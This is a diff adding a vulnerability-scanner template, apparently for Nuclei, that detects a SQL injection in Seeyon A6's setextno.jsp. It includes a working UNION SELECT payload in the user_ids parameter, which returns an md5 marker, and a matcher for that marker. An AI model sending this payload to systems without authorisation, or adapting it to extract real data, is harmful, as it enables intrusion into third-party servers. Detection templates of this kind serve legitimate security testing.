@@ -1,0 +1,23 @@
+id: seeyon-setextno-sqli
+
+info:
+  name: Seeyon A6 setextno SQL Injection
+  author: local
+  severity: high
+  description: Detects the Seeyon A6 setextno SQL injection with a fixed harmless marker.
+  tags: seeyon,zhiyuan,a6,sqli,active
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999)%20union%20all%20select%201,2,(md5(168)),4%23"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '006f52e9102a8d3be2fe5614f42ba989'
+
